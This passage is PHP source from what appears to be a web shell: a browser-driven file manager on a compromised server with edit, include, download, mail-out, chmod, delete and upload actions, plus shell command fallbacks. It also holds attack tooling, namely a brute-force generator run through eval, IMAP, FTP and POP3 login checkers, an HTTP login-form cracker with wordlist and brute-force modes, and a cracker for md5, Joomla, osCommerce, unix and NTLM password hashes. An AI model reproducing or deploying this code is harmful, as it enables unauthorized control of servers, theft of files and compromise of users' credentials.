			if (class_exists ( 'COM' )) {
				$obj = new COM ( 'scripting.filesystemobject' );
				if (is_object ( $obj )) {
					$type = array ('Unknow', 'Removable', 'Fixed', 'Network', 'CD-ROM', 'RAM Disk' );
					$drivelist = array ();
					foreach ( $obj->Drives as $drive ) {
						if ($drive->IsReady)
							$drivelist [] = "<a href='" . hlinK ( 'seC=fm&workingdiR=' . $drive->DriveLetter . ':\\' ) . "' title='Type: " . $type [$drive->DriveType] . "\nFile system: " . $drive->FileSystem . "\nSerial: " . $drive->SerialNumber . "\nShare name: " . $drive->ShareName . "\nFree: " . showsizE ( $drive->AvailableSpace ) . "\nTotall: " . showsizE ( $drive->TotalSize ) . "'>" . $drive->DriveLetter . ':\</a>';
					}
				}
				echo implode ( ' - ', $drivelist );
			} else {
				for($i = 66; $i <= 90; $i ++) {
					$drive = chr ( $i ) . ':';
					if (@disk_total_space ( $drive )) {
						echo " <a title='$drive' href=" . hlinK ( "seC=fm&workingdiR=$drive\\" ) . ">$drive\\</a>";
					}
				}
			}
			echo "</td><tr></table>";
		}
	}
	$ext = array ('7z', 'ai', 'aiff', 'asc', 'avi', 'bat', 'bin', 'bz2', 'c', 'cfc', 'cfm', 'chm', 'class', 'com', 'conf', 'cpp', 'cs', 'css', 'csv', 'dat', 'deb', 'divx', 'dll', 'doc', 'dot', 'eml', 'enc', 'exe', 'flv', 'gif', 'gz', 'hlp', 'htaccess', 'htpasswd', 'htm', 'html', 'ico', 'image', 'iso', 'jar', 'java', 'jpeg', 'jpg', 'js', 'link', 'log', 'lua', 'm', 'm4v', 'mid', 'mm', 'mov', 'mp3', 'mpg', 'odc', 'odf', 'odg', 'odi', 'odp', 'ods', 'odt', 'ogg', 'pdf', 'pgp', 'php', 'pl', 'png', 'ppt', 'ps', 'py', 'ram', 'rar', 'rb', 'rm', 'rpm', 'rtf', 'sig', 'shtml', 'sql', 'swf', 'sxc', 'sxd', 'sxi', 'sxw', 'tar', 'tex', 'tgz', 'txt', 'vcf', 'vsd', 'wav', 'wma', 'wmv', 'xls', 'xml', 'xpi', 'xvid', 'zip' );
	echo '
<table border="0" cellspacing="0" cellpadding="0" width="100%"><tr><th width="100%" align="left"><a href="javascript:history.go(-1)"><img src="' . $Resource_Dir . 'images/fmback.png" title="Back" border="0" /></a><a href="' . hlinK ( "seC=fm&workingdiR=$cwd" . DIRECTORY_SEPARATOR . '..' ) . '"><img src="' . $Resource_Dir . 'images/up.png" title="Up" border="0" /></a><a href="' . hlinK ( "seC=fm" ) . '"><img src="' . $Resource_Dir . 'images/home.png" title="Home" border="0" /></a><a href="' . hlinK ( "seC=fm&workingdiR=$cwd" ) . '"><img src="' . $Resource_Dir . 'images/refresh.png" title="Refresh" border="0" /></a></th></tr></table>';
	$file = $dir = $link = array ();
	if ($dirhandle = opendir ( $cwd )) {
		while ( $cont = readdir ( $dirhandle ) ) {
			if (is_dir ( $cwd . DIRECTORY_SEPARATOR . $cont ))
				$dir [] = $cont;
			elseif (is_file ( $cwd . DIRECTORY_SEPARATOR . $cont ))
				$file [] = $cont;
			else
				$link [] = $cont;
		}
	} elseif (! $windows) {
		$r = array ();
		$r = explode ( "\n", shelL ( 'ls -la | grep ^-' ) );
		foreach ( $r as $v )
			if (trim ( $v ))
				$file [] = trim ( end ( explode ( " ", $v ) ) );
		$r = explode ( "\n", shelL ( 'ls -la | grep ^d' ) );
		foreach ( $r as $v )
			if (trim ( $v ))
				$dir [] = trim ( end ( explode ( " ", $v ) ) );
		$r = explode ( "\n", shelL ( 'ls -la | grep ^l' ) );
		foreach ( $r as $v )
			if (trim ( $v ))
				$link [] = trim ( end ( explode ( " ", $v ) ) );
	}
	sort ( $file );
	sort ( $dir );
	sort ( $link );
	$c = 0;
	$sp=(!empty($_REQUEST['startP']))?$_REQUEST['startP']:0;
	echo '<table border="0" cellspacing="0" cellpadding="0" width="100%" class="sortable"><tr><th width="10">&nbsp;</th><th width="290"><b>Name</b></th><th width="100"><b>Owner</b></th><th width="120"><b>Modification</b></th><th width="120"><b>Last access</b></th><th width="30"><b>Permission</b></th><th width="45"><b>Size</b></th><th width="50"><b>Actions</b></th></tr>';
	foreach ( $dir as $dn ) {
		$c++;
		if($c<=$sp)continue;
		if(($c - $sp)==251)break;
		echo '<tr onMouseOver="this.className=\'highlight\'" onMouseOut="this.className=\'normal\'"><td><a href="' . hlinK ( 'seC=fm&workingdiR=' . realpath ( $dn ) ) . '" title="' . $dn . '"><img src="' . $Resource_Dir . 'images/icon/directory.png" border="0" /></a></td><td>';
		$own = 'Unknown';
		$owner = posix_getpwuid ( @fileowner ( $dn ) );
		$mdate = date ( 'Y/m/d H:i:s', @filemtime ( $dn ) );
		$adate = date ( 'Y/m/d H:i:s', @fileatime ( $dn ) );
		$cote = (strlen ( $dn ) > 30) ? substr ( $dn, 0, 27 ) . '...' : $dn;
		$diraction = $select . hlinK ( 'seC=fm&workingdiR=' . realpath ( $dn ) ) . "'>Open</option><option value='" . hlinK ( "seC=fm&workingdiR=$cwd&rN=$dn" ) . "'>Rename</option><option value='" . hlinK ( "seC=fm&deL=$dn&workingdiR=$cwd" ) . "'>Remove</option></select></td>";
		if ($owner)
			$own = "<a title='Shell: " . $owner ['shell'] . "' href='" . hlinK ( 'seC=fm&workingdiR=' . $owner ['dir'] ) . "'>" . perm2coloR ( $dn, $owner ['name'] ) . '</a>';
		echo '<a href="' . hlinK ( 'seC=fm&workingdiR=' . realpath ( $dn ) ) . '" title="' . $dn . '">' . perm2coloR ( $dn, $cote ) . "</a></td><td>$own</td><td>" . perm2coloR ( $dn, $mdate ) . "</td><td>" . perm2coloR ( $dn, $adate ) . "</td><td><a href='#' onClick=\"javascript:chmoD('$dn')\" title='Change mode'>" . perm2coloR ( $dn, permS ( @fileperms ( $dn ) ) ) . "</a></td><td>" . perm2coloR ( $dn, "------" ) . "</td><td>$diraction</tr>";
	}
	foreach ( $file as $fn ) {
		$c++;
		if($c<=$sp)continue;
		if(($c - $sp)==251)break;
		$own = 'Unknown';
		$owner = posix_getpwuid ( fileowner ( $fn ) );
		$fileaction = $select . hlinK ( "seC=openit&namE=$fn&workingdiR=$cwd" ) . "'>Open</option><option value='" . hlinK ( "seC=edit&filE=$fn&workingdiR=$cwd" ) . "'>Edit</option><option value='" . hlinK ( "seC=fm&downloaD=$fn&workingdiR=$cwd" ) . "'>Download</option><option value='" . hlinK ( "seC=hex&filE=$fn&workingdiR=$cwd" ) . "'>Hex view</option><option value='" . hlinK ( "seC=img&filE=$fn&workingdiR=$cwd" ) . "'>Image</option><option value='" . hlinK ( "seC=inc&filE=$fn&workingdiR=$cwd" ) . "'>Include</option><option value='" . hlinK ( "seC=checksum&filE=$fn&workingdiR=$cwd" ) . "'>Checksum</option><option value='" . hlinK ( "seC=mailer&attacH=$fn&workingdiR=$cwd" ) . "'>Send by mail</option><option value='" . hlinK ( "seC=fm&workingdiR=$cwd&cP=$fn" ) . "'>Copy</option><option value='" . hlinK ( "seC=fm&workingdiR=$cwd&mV=$fn" ) . "'>Move</option><option value='" . hlinK ( "seC=fm&deL=$fn&workingdiR=$cwd" ) . "'>Remove</option></select></td>";
		$mdate = date ( 'Y/m/d H:i:s', filemtime ( $fn ) );
		$adate = date ( 'Y/m/d H:i:s', fileatime ( $fn ) );
		if ($owner)
			$own = "<a title='Shell:" . $owner ['shell'] . "' href='" . hlinK ( 'seC=fm&workingdiR=' . $owner ['dir'] ) . "'>" . perm2coloR ( $fn, $owner ['name'] ) . '</a>';
		$size = showsizE ( filesize ( $fn ) );
		$type = @strtolower ( end ( explode ( ".", $fn ) ) );
		if (! in_array ( $type, $ext ))
			$type = 'unknown';
		echo '<tr onMouseOver="this.className=\'highlight\'" onMouseOut="this.className=\'normal\'"><td><a href="' . hlinK ( "seC=openit&namE=$fn&workingdiR=$cwd" ) . '" title="' . $fn . '"><img src="' . $Resource_Dir . 'images/icon/' . $type . '.png" border="0" /></a></td><td>';

		echo '<a href="' . hlinK ( "seC=openit&namE=$fn&workingdiR=$cwd" ) . '" title="' . $fn . '">';
		$cote = (strlen ( $fn ) > 30) ? substr ( $fn, 0, 27 ) . '...' : $fn;
		if (in_array ( $fn, $cfg ))
			$cote = "<b>$cote</b>";
		echo perm2coloR ( $fn, $cote ) . '</a></td>';
		echo "<td>" . perm2coloR ( $fn, $own ) . "</td><td>" . perm2coloR ( $fn, $mdate ) . "</td><td>" . perm2coloR ( $fn, $adate ) . "</td></td><td>";
		echo "<a href='#' onClick=\"javascript:chmoD('$fn')\" title='Change mode'>" . perm2coloR ( $fn, permS ( fileperms ( $fn ) ) ) . '</a></td>';
		echo "<td>" . perm2coloR ( $fn, $size ) . "</td>";
		echo "<td>$fileaction";
		echo '</tr>';
	}
	foreach ( $link as $ln ) {
		$c++;
		if($c<=$sp)continue;
		if(($c - $sp)==251)break;
		$own = 'Unknown';
		$owner = posix_getpwuid ( @fileowner ( $ln ) );
		$linkaction = $select . hlinK ( "seC=openit&namE=$ln&workingdiR=$ln" ) . "'>Open</option><option value='" . hlinK ( "seC=edit&filE=$ln&workingdiR=$cwd" ) . "'>Edit</option><option value='" . hlinK ( "seC=fm&downloaD=$ln&workingdiR=$cwd" ) . "'>Download</option><option value='" . hlinK ( "seC=hex&filE=$ln&workingdiR=$cwd" ) . "'>Hex view</option><option value='" . hlinK ( "seC=img&filE=$ln&workingdiR=$cwd" ) . "'>Image</option><option value='" . hlinK ( "seC=inc&filE=$ln&workingdiR=$cwd" ) . "'>Include</option><option value='" . hlinK ( "seC=checksum&filE=$ln&workingdiR=$cwd" ) . "'>Checksum</option><option value='" . hlinK ( "seC=mailer&attacH=$ln&workingdiR=$cwd" ) . "'>Send by mail</option><option value='" . hlinK ( "seC=fm&workingdiR=$cwd&cP=$ln" ) . "'>Copy</option><option value='" . hlinK ( "seC=fm&workingdiR=$cwd&mV=$ln" ) . "'>Move</option><option value='" . hlinK ( "seC=fm&workingdiR=$cwd&rN=$ln" ) . "'>Rename</option><option value='" . hlinK ( "seC=fm&deL=$ln&workingdiR=$cwd" ) . "'>Remove</option></select></td>";
		$mdate = date ( 'Y/m/d H:i:s', @filemtime ( $ln ) );
		$adate = date ( 'Y/m/d H:i:s', @fileatime ( $ln ) );
		if ($owner)
			$own = "<a title='Shell: " . $owner ['shell'] . "' href='" . hlinK ( 'seC=fm&workingdiR=' . $owner ['dir'] ) . "'>" . $owner ['name'] . '</a>';
		echo '<tr onMouseOver="this.className=\'highlight\'" onMouseOut="this.className=\'normal\'"><td><a href="' . hlinK ( 'seC=fm&workingdiR=' . realpath ( $ln ) ) . '" title="' . $ln . '"><img src="' . $Resource_Dir . 'images/icon/link.png" border="0" /></a></td><td>';
		$size = showsizE ( @filesize ( $ln ) );
		echo '<a href="' . hlinK ( "seC=openit&namE=$ln&workingdiR=$cwd" ) . '" title="' . $ln . '">';
		$cote = (strlen ( $ln ) > 30) ? substr ( $ln, 0, 27 ) . '...' : $ln;
		echo perm2coloR ( $ln, $cote ) . '</a></td>';
		echo "<td>" . perm2coloR ( $ln, $own ) . "</td>";
		echo "<td>" . perm2coloR ( $ln, $mdate ) . "</td>";
		echo "<td>" . perm2coloR ( $ln, $adate ) . "</td>";
		echo "</td><td>";
		echo "<a href='#' onClick=\"javascript:chmoD('$ln')\" title='Change mode'>" . perm2coloR ( $ln, permS ( @fileperms ( $ln ) ) ) . '</a></td>';
		echo "<td>" . perm2coloR ( $ln, $size ) . "</td>";
		echo "<td>$linkaction";
		echo '</tr>';
	}
	$dc = count ( $dir ) - 2;
	if ($dc == - 2)
		$dc = 0;
	$fc = count ( $file );
	$lc = count ( $link );
	$total = $dc + $fc + $lc;
	$min = min ( substr ( ini_get ( 'upload_max_filesize' ), 0, strpos ( ini_get ( 'post_max_size' ), 'M' ) ), substr ( ini_get ( 'post_max_size' ), 0, strpos ( ini_get ( 'post_max_size' ), 'M' ) ) ) . ' MB';
	echo '</table><br />';
	if($total>250){
		echo '<div align="center">';
		if($sp)echo '<a href="'.hlinK ( 'seC=fm&workingdiR='.$cwd."&startP=".($sp-250)). '">&lt;Previous page</a>';
		if(($sp+250)<$total)echo '<a href="'.hlinK ( 'seC=fm&workingdiR='.$cwd."&startP=".($sp+250)). '">Next page&gt;</a>';
		echo "</div><br />";
	}
	echo '<table border="0" cellspacing="0" cellpadding="0" width="100%">
<tr><td colspan="7">Directory summery: Total:' . $total . ' Directories:' . $dc . ' Files:' . $fc . ' Links:' . $lc . ' Permission:' . permS ( fileperms ( $cwd ) ) . '</td><tr><td colspan="7">&nbsp;</td></tr><tr><td colspan="3"><form method="POST">Find: <input type="text" size="25" value="$pass" name="search"> <input type="checkbox" name="re" value="1">Regular expressions<div class="buttonsdiv"><input type="submit" value="Find"></div>' . $hcwd . '<input type="hidden" value="7" name="task"></form></td><td colspan="4"><form method="POST">' . $hcwd . '<input type="hidden" value="fm" name="seC"><select name="task"><option value="0">Display files and directories in current folder</option><option value="1">Find writable files and directories in current folder</option><option value="2">Find writable files in current folder</option><option value="3">Find writable directories in current folder</option><option value="4">Display all files in current folder</option><option value="5">Display all directories in current folder</option></select><div class="buttonsdiv"><input type="submit" value="Start"><div class="buttonsdiv"></form></td></tr>
</table><br />
<table width=100% border="0" cellspacing="0" cellpadding="0">
<tr><th width=50%>New:</th><th width=50%>Upload:</th></tr>
<tr>
<td><form method="POST"><input type="text" size="25" value="Unnamed" name="newf">
<div class="buttonsdiv"><input type="submit" name="newfile" value="New File"><input type="submit" name="newdir" value="New Directory"></div></form></td>
<td><form method="POST" enctype="multipart/form-data"><input type="file" size="15" name="uploadfile">' . $hcwd . '<div class="buttonsdiv"><input type="submit" value="Upload"></div><br />Note: Max allowed file size to upload on this server is ' . $min . '</form></td></tr></table>';
}
function brute($charset, $min, $max, $check) {

	if ($charset == "all") {
		$vals = range ( ' ', '~' );
	} elseif ($charset == "09") {
		$vals = range ( '0', '9' );
	} elseif ($charset == "az") {
		$vals = range ( 'a', 'z' );
	} elseif ($charset == "az09") {
		$vals = array_merge ( range ( 'a', 'z' ), range ( '0', '9' ) );
	} elseif ($charset == "az09AZ") {
		$vals = array_merge ( range ( 'a', 'z' ), range ( 'A', 'Z' ), range ( '0', '9' ) );
	}

	$A = array ();
	$numVals = count ( $vals );
	$incDone = "";
	$realMax = "";
	$currentVal = "";
	$firstVal = "";
	for($i = 0; $i < ($max + 1); $i ++) {
		$A [$i] = - 1;
	}
	for($i = 0; $i < $max; $i ++) {
		$realMax = $realMax . $vals [$numVals - 1];
	}
	for($i = 0; $i < $min; $i ++) {
		$A [$i] = $vals [0];
	}
	$i = 0;
	while ( $A [$i] != - 1 ) {
		$firstVal .= $A [$i];
		$i ++;
	}
	$test = false;
	$word = $firstVal;
	eval ( $check );
	if ($test)
		return $firstVal;
	while ( 1 ) {
		for($i = 0; $i < ($max + 1); $i ++) {
			if ($A [$i] == - 1) {
				break;
			}
		}
		$i --;
		$incDone = 0;
		while ( ! $incDone ) {
			for($j = 0; $j < $numVals; $j ++) {
				if ($A [$i] == $vals [$j]) {
					break;
				}
			}
			if ($j == ($numVals - 1)) {
				$A [$i] = $vals [0];
				$i --;
				if ($i < 0) {
					for($i = 0; $i < ($max + 1); $i ++) {
						if ($A [$i] == - 1) {
							break;
						}
					}
					$A [$i] = $vals [0];
					$A [$i + 1] = - 1;
					$incDone = 1;
					print "Starting " . (strlen ( $currentVal ) + 1) . " Characters Cracking<br />";
					@flush_buffers ();
				}
			} else {
				$A [$i] = $vals [$j + 1];
				$incDone = 1;
			}
		}
		$i = 0;
		$currentVal = "";
		while ( $A [$i] != - 1 ) {
			$currentVal = $currentVal . $A [$i];
			$i ++;
		}
		$word = $currentVal;
		eval ( $check );
		if ($test) {
			return $currentVal;
		}
		if ($currentVal == $realMax) {
			return null;
		}
	}
}
function imapchecK($host, $username, $password, $timeout) {
	$sock = @fsockopen ( $host, 143, $n, $s, $timeout );
	$b = uniqid ( 'NJ' );
	$l = strlen ( $b );
	if (! $sock)
		return - 1;
	fread ( $sock, 1024 );
	fputs ( $sock, "$b LOGIN $username $password\r\n" );
	$res = fgets ( $sock, $l + 4 );
	fclose ( $sock );
	if ($res == "$b OK")
		return 1;
	else
		return 0;
}
function ftpchecK($host, $username, $password, $timeout) {
	$ftp = ftp_connect ( $host, 21, $timeout );
	if (! $ftp)
		return - 1;
	$con = @ftp_login ( $ftp, $username, $password );
	ftp_close ( $ftp );
	if ($con)
		return 1;
	else
		return 0;
}
function pop3checK($server, $user, $pass, $timeout) {
	$sock = @fsockopen ( $server, 110, $en, $es, $timeout );
	if (! $sock)
		return - 1;
	fread ( $sock, 1024 );
	fwrite ( $sock, "user $user\n" );
	$r = fgets ( $sock );
	if ($r {0} == '-')
		return 0;
	fwrite ( $sock, "pass $pass\n" );
	$r = fgets ( $sock );
	fclose ( $sock );
	if ($r {0} == '+')
		return 1;
	return 0;
}
function formcrackeR() {
	global $hcwd;
	if (! empty ( $_REQUEST ['start'] )) {
		if (isset ( $_REQUEST ['loG'] ) && ! empty ( $_REQUEST ['logfilE'] )) {
			$log = 1;
			$file = $_REQUEST ['logfilE'];
		} else
			$log = 0;
		$uf = $_REQUEST ['userf'];
		$pf = $_REQUEST ['passf'];
		$sf = $_REQUEST ['submitf'];
		$sv = $_REQUEST ['submitv'];
		$method = $_REQUEST ['method'];
		$fail = $_REQUEST ['fail'];
		if (! empty ( $_REQUEST ['dictionary'] ))
			$dic = $_REQUEST ['dictionary'];
		$type = $_REQUEST ['combo'];
		$user = (! empty ( $_REQUEST ['user'] )) ? $_REQUEST ['user'] : '';
		if ($_REQUEST ['mode'] == 'wl') {
			$dictionary = fopen ( $dic, 'r' );
			if ($dictionary) {
				echo '<font color=#FA0>Cracking...<br>';
				while ( ! feof ( $dictionary ) ) {
					$url = $_REQUEST ['target'];
					if ($type) {
						$combo = trim ( fgets ( $dictionary ), " \n\r" );
						$user = substr ( $combo, 0, strpos ( $combo, ':' ) );
						$pass = substr ( $combo, strpos ( $combo, ':' ) + 1 );
					} else {
						$pass = trim ( fgets ( $dictionary ), " \n\r" );
					}
					$url .= "?$uf=$user&$pf=$pass&$sf=$sv";
					$res = check_urL ( $url, $method, $fail, 12 );
					if (! $res) {
						echo "<font color=#FA0>U: $user P: $pass</font><br>";
						if ($log)
							file_add_contentS ( $file, "U: $user P: $pass\r\n" );
						if (! $type)
							break;
					}
				}
				fclose ( $dictionary );
			} else {
				echo "Can not open dictionary.";
			}
		} else {
			$code = '$test=!check_urL("' . $_REQUEST ['target'] . '?' . $uf . '=' . $user . '&' . $pf . '=$word&' . $sf . '=' . $sv . '","' . $method . '","' . $fail . '",12);';
			@flush_buffers ();
			if ($res = brute ( $_REQUEST ['mode'], $_REQUEST ['min'], $_REQUEST ['max'], $code )) {
				echo "<b>$user:$res</b><br />";
				if ($log)
					file_add_contentS ( $file, "U: $user P: $res\r\n" );
			}
		}
		echo 'Done!</font><br>';
	} else
		echo '<form name=cracker method="POST">
<div class="fieldwrapper">
<label class="styled" style="width:320px">HTTP Form cracker</label>
</div>
<div class="fieldwrapper"><label class="styled">Input:</label><div class="thefield">
<select name="mode" id="mode" onChange="toggle()">
<option value="09">Bruteforce [0-9]</option>
<option value="az">Bruteforce [a-z]</option>
<option value="az09">Bruteforce [a-z] [0-9]</option>
<option value="az09AZ">Bruteforce [a-z] [A-Z] [0-9]</option>
<option value="all">Bruteforce [ALL]</option>
<option value="wl">Wordlist</option>
</select>
</div></div>
<div class="fieldwrapper" id="dic">
<label class="styled">Dictionary:</label>
<div class="thefield">
<input type="text" name="dictionary" size="30" />
</div>
</div>
<div class="fieldwrapper" id="fcr">
<label class="styled">Dictionary type:</label>
<div class="thefield">
<ul style="margin-top:0;">
<li><input type="radio" value="0" checked name="combo" onClick="document.cracker.user.disabled = false;" /> <label>Simple (P)</label></li>
<li><input type="radio" name="combo" value="1" onClick="document.cracker.user.disabled = true;" /> <label>Combo (U:P)</label></li>
</ul>
</div>
</div><div class="fieldwrapper">
<label class="styled">Username:</label>
<div class="thefield">
<input type="text" name="user" value="admin" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Action:</label>
<div class="thefield">
<input type="url" name="target" value="http://' . getenv ( 'HTTP_HOST' ) . '/login.php" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Method:</label>
<div class="thefield">
<select name="method"><option selected value="POST">POST</option><option value="GET">GET</option></select>
</div>
</div><div class="fieldwrapper">
<label class="styled">Username field:</label>
<div class="thefield">
<input type="text" name="userf" value="username" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Password field:</label>
<div class="thefield">
<input type="text" name="passf" value="passwd" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Submit name:</label>
<div class="thefield">
<input type="text" name="submitf" value="submit" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Submit value:</label>
<div class="thefield">
<input type="text" name="submitv" value="Login" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled">Fail string:</label>
<div class="thefield">
<input type="text" name="fail" value="Try again" size="30" />
</div>
</div><div class="fieldwrapper">
<label class="styled"><input type=checkbox name=loG value=1 onClick="document.cracker.logfilE.disabled = !document.cracker.logfilE.disabled;" checked> Log:</label>
<div class="thefield">
<input type=text name=logfilE size=25 value="' . whereistmP () . DIRECTORY_SEPARATOR . '.log">
</div>
</div>
' . $hcwd . '
<div class="buttonsdiv">
<input type="submit" name="start" value="Start" style="margin-left: 150px;" />
</div>
</form><script type="text/JavaScript">
toggle();
</script>';
}

class PasswordHash {
	var $itoa64;
	var $iteration_count_log2;
	var $portable_hashes;
	var $random_state;

	function PasswordHash($iteration_count_log2, $portable_hashes) {
		$this->itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';

		if ($iteration_count_log2 < 4 || $iteration_count_log2 > 31)
			$iteration_count_log2 = 8;
		$this->iteration_count_log2 = $iteration_count_log2;

		$this->portable_hashes = $portable_hashes;

		$this->random_state = microtime ();
		if (function_exists ( 'getmypid' ))
			$this->random_state .= getmypid ();
	}

	function get_random_bytes($count) {
		$output = '';
		if (is_readable ( '/dev/urandom' ) && ($fh = @fopen ( '/dev/urandom', 'rb' ))) {
			$output = fread ( $fh, $count );
			fclose ( $fh );
		}

		if (strlen ( $output ) < $count) {
			$output = '';
			for($i = 0; $i < $count; $i += 16) {
				$this->random_state = md5 ( microtime () . $this->random_state );
				$output .= pack ( 'H*', md5 ( $this->random_state ) );
			}
			$output = substr ( $output, 0, $count );
		}

		return $output;
	}

	function encode64($input, $count) {
		$output = '';
		$i = 0;
		do {
			$value = ord ( $input [$i ++] );
			$output .= $this->itoa64 [$value & 0x3f];
			if ($i < $count)
				$value |= ord ( $input [$i] ) << 8;
			$output .= $this->itoa64 [($value >> 6) & 0x3f];
			if ($i ++ >= $count)
				break;
			if ($i < $count)
				$value |= ord ( $input [$i] ) << 16;
			$output .= $this->itoa64 [($value >> 12) & 0x3f];
			if ($i ++ >= $count)
				break;
			$output .= $this->itoa64 [($value >> 18) & 0x3f];
		} while ( $i < $count );

		return $output;
	}

	function gensalt_private($input) {
		$output = '$P$';
		$output .= $this->itoa64 [min ( $this->iteration_count_log2 + ((PHP_VERSION >= '5') ? 5 : 3), 30 )];
		$output .= $this->encode64 ( $input, 6 );

		return $output;
	}

	function crypt_private($password, $setting) {
		$output = '*0';
		if (substr ( $setting, 0, 2 ) == $output)
			$output = '*1';

		$id = substr ( $setting, 0, 3 );

		if ($id != '$P$' && $id != '$H$')
			return $output;

		$count_log2 = strpos ( $this->itoa64, $setting [3] );
		if ($count_log2 < 7 || $count_log2 > 30)
			return $output;

		$count = 1 << $count_log2;

		$salt = substr ( $setting, 4, 8 );
		if (strlen ( $salt ) != 8)
			return $output;
		if (PHP_VERSION >= '5') {
			$hash = md5 ( $salt . $password, TRUE );
			do {
				$hash = md5 ( $hash . $password, TRUE );
			} while ( -- $count );
		} else {
			$hash = pack ( 'H*', md5 ( $salt . $password ) );
			do {
				$hash = pack ( 'H*', md5 ( $hash . $password ) );
			} while ( -- $count );
		}

		$output = substr ( $setting, 0, 12 );
		$output .= $this->encode64 ( $hash, 16 );

		return $output;
	}

	function gensalt_extended($input) {
		$count_log2 = min ( $this->iteration_count_log2 + 8, 24 );

		$count = (1 << $count_log2) - 1;

		$output = '_';
		$output .= $this->itoa64 [$count & 0x3f];
		$output .= $this->itoa64 [($count >> 6) & 0x3f];
		$output .= $this->itoa64 [($count >> 12) & 0x3f];
		$output .= $this->itoa64 [($count >> 18) & 0x3f];

		$output .= $this->encode64 ( $input, 3 );

		return $output;
	}

	function gensalt_blowfish($input) {
		$itoa64 = './ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

		$output = '$2a$';
		$output .= chr ( ord ( '0' ) + $this->iteration_count_log2 / 10 );
		$output .= chr ( ord ( '0' ) + $this->iteration_count_log2 % 10 );
		$output .= '$';

		$i = 0;
		do {
			$c1 = ord ( $input [$i ++] );
			$output .= $itoa64 [$c1 >> 2];
			$c1 = ($c1 & 0x03) << 4;
			if ($i >= 16) {
				$output .= $itoa64 [$c1];
				break;
			}

			$c2 = ord ( $input [$i ++] );
			$c1 |= $c2 >> 4;
			$output .= $itoa64 [$c1];
			$c1 = ($c2 & 0x0f) << 2;

			$c2 = ord ( $input [$i ++] );
			$c1 |= $c2 >> 6;
			$output .= $itoa64 [$c1];
			$output .= $itoa64 [$c2 & 0x3f];
		} while ( 1 );

		return $output;
	}

	function HashPassword($password) {
		$random = '';

		if (CRYPT_BLOWFISH == 1 && ! $this->portable_hashes) {
			$random = $this->get_random_bytes ( 16 );
			$hash = crypt ( $password, $this->gensalt_blowfish ( $random ) );
			if (strlen ( $hash ) == 60)
				return $hash;
		}

		if (CRYPT_EXT_DES == 1 && ! $this->portable_hashes) {
			if (strlen ( $random ) < 3)
				$random = $this->get_random_bytes ( 3 );
			$hash = crypt ( $password, $this->gensalt_extended ( $random ) );
			if (strlen ( $hash ) == 20)
				return $hash;
		}

		if (strlen ( $random ) < 6)
			$random = $this->get_random_bytes ( 6 );
		$hash = $this->crypt_private ( $password, $this->gensalt_private ( $random ) );
		if (strlen ( $hash ) == 34)
			return $hash;

		return '*';
	}

	function CheckPassword($password, $stored_hash) {
		$hash = $this->crypt_private ( $password, $stored_hash );
		if ($hash [0] == '*')
			$hash = crypt ( $password, $stored_hash );

		return $hash == $stored_hash;
	}
}

function hashcrackeR() {
	global $hcwd;
	if (! empty ( $_REQUEST ['bench'] )) {
		$type = $_REQUEST ['type'];
		$salt1 = $salt2 = '';
		switch ($type) {
			case 'joomla' :
			case 'oscommerce' :
				$type = 'md5';
				break;
			case 'unix' :
				$hash_class = new PasswordHash ( 8, TRUE );
				break;
			case 'ntlm' :
				$type = 'md4';
				$ntlm = true;
		}
		$total = 10000;
		$str = array ();
		for($i = 0; $i <= 100; $i ++) {
			$tmp = substr ( uniqid (), 0, rand ( 0, 20 ) );
			if (isset ( $ntlm ))
				$tmp = iconv ( 'UTF-8', 'UTF-16LE', $tmp );
			$str [] = $tmp;
		}
		$time = microtime ();
		$time = explode ( ' ', $time );
		$time = $time [1] + $time [0];
		$start = $time;
		if ($type == 'unix') {
			for($j = $i = 0; $i <= $total; $i ++, $j ++) {
				$hash_class->CheckPassword ( $str [$j], '$1$oH1UcDh5$d35NP05cR2atgjVfK0jq9.' );
				if ($j == 100)
					$j = 0;
			}
		} else {
			for($j = $i = 0; $i <= $total; $i ++, $j ++) {
				hash ( $type, $salt1 . $str [$j] . $salt2 );
				if ($j == 100)
					$j = 0;
			}
		}
		$time = microtime ();
		$time = explode ( ' ', $time );
		$time = $time [1] + $time [0];
		$finish = $time;
		$time = $finish - $start;
		if(isset($ntlm))$type='ntlm';
		echo "<font color=#FA0>Generating $total $type hash took about <b>" . round ( $time, 2 ) . "s</b>. (<b>" . round ( $total / $time, 2 ) . '</b> hash per second.)</font><br />';

	} elseif (! empty ( $_REQUEST ['hash'] ) && ! empty ( $_REQUEST ['type'] )) {
		if (isset ( $_REQUEST ['loG'] ) && ! empty ( $_REQUEST ['logfilE'] )) {
			$log = 1;
			$file = $_REQUEST ['logfilE'];
		} else
			$log = 0;
		$hash = $_REQUEST ['hash'];

		echo '<font color=#FA0>Cracking ' . htmlspecialchars ( $hash ) . '...<br />';
		$type = $_REQUEST ['type'];
		$salt1 = $salt2 = '';
		switch ($type) {
			case 'joomla' :
				$tmp = explode ( ':', $hash );
				$salt2 = end ( $tmp );
				$type = 'md5';
				$hash = $tmp [0];
				break;
			case 'oscommerce' :
				$tmp = explode ( ':', $hash );
				$salt1 = end ( $tmp );
				$type = 'md5';
				$hash = $tmp [0];
				break;
			case 'unix' :
				$hash_class = new PasswordHash ( 8, TRUE );
				break;
			case 'ntlm' :
				$type = 'md4';
				$ntlm = true;

		}
		if ($type != 'unix')
			$hash = strtoupper ( $hash );
		if ($_REQUEST ['mode'] == "wl") {
			$dictionary = fopen ( $_REQUEST ['dictionary'], 'r' );
			if ($dictionary) {
				while ( ! feof ( $dictionary ) ) {
					$word = trim ( fgets ( $dictionary ) );
					if ($type == 'unix') {
						if ($hash_class->CheckPassword ( $word, $hash )) {
							echo "Plaintext: <b>$word</b><br />";
							if ($log)
								file_add_contentS ( $file, "$word\r\n" );
							break;
						}
					} else {

						if (isset ( $ntlm ))
							$word = iconv ( 'UTF-8', 'UTF-16LE', $word );
						if ($hash == strtoupper ( (hash ( $type, $salt1 . $word . $salt2 )) )) {
							echo "Plaintext: <b>$word</b><br />";
							if ($log)
								file_add_contentS ( $file, "$word\r\n" );
							break;
						}
					}
				}
				fclose ( $dictionary );
			} else {
